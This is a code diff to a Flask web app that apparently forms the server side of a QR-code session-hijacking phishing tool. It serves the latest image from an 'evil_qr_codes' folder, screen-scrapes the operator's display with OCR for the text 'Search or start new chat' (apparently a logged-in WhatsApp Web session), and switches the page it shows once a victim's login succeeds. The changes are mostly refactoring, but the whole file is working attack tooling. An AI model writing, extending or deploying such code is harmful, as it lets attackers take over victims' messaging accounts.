@@ -10,9 +10,7 @@ import threading
 
 app = Flask(__name__)
 
-
 render_xyz = False
-
 
 def get_latest_qr_code():
     qr_code_dir = "evil_qr_codes"
@@ -22,13 +20,13 @@ def get_latest_qr_code():
         return latest_qr_code
     return None
 
-
 def check_strings_in_screenshot(strings_to_check):
+    try:
+        screenshot = pyautogui.screenshot()
+    except Exception as e:
+        print(f"An error occurred while taking a screenshot: {str(e)}")
+        return False
 
-    x, y, width, height = 0, 0, 800, 600
-    screenshot = pyautogui.screenshot(region=(x, y, width, height))
-
-    
     tools = pyocr.get_available_tools()
     if len(tools) == 0:
         print("No OCR tool found. Install Tesseract OCR.")
@@ -37,35 +35,31 @@ def check_strings_in_screenshot(strings_to_check):
     tool = tools[0]
     txt = tool.image_to_string(screenshot, lang='eng', builder=pyocr.builders.TextBuilder())
 
-   # print("Extracted Text:", txt)  # For debugging purposes
-
-    # Check if the strings are present in the extracted text
     for s in strings_to_check:
         if s in txt:
             return True
 
     return False
 
-
 def background_check():
     global render_xyz
-    strings_to_check = ["Search or start new chat"]  
+    strings_to_check = ["Search or start new chat"]
     while True:
         if check_strings_in_screenshot(strings_to_check):
+            print("Text found in screenshot")
             render_xyz = True
         else:
+            print("Text not found in screenshot")
             render_xyz = False
-        time.sleep(1)  # Adjust the interval as needed
-
+        time.sleep(1)
 
 bg_thread = threading.Thread(target=background_check)
 bg_thread.daemon = True
 bg_thread.start()
 
-#
 @app.route('/')
 def index():
-    global render_xyz  
+    global render_xyz
     latest_qr_code = get_latest_qr_code()
     latest_qr_code_filename = os.path.basename(latest_qr_code) if latest_qr_code else None
 
@@ -74,14 +68,12 @@ def index():
     else:
         return render_template('index.html', latest_qr_code_filename=latest_qr_code_filename)
 
-
 @app.route('/xyz_html_rendered')
 def xyz_html_rendered():
     return jsonify({"xyz_html_rendered": render_xyz})
 
-
 @app.route('/latest_qr_code')
-def latest_qr_code():
+def latest_qr_code_image():
     latest_qr_code = get_latest_qr_code()
     if latest_qr_code:
         with open(latest_qr_code, "rb") as file:
@@ -90,6 +82,5 @@ def latest_qr_code():
     else:
         return jsonify({"qr_image": None, "xyz_html_rendered": render_xyz})
 
-
 if __name__ == "__main__":
-    app.run(host='0.0.0.0', port=5000)
+    app.run(host='0.0.0.0', port=8080)
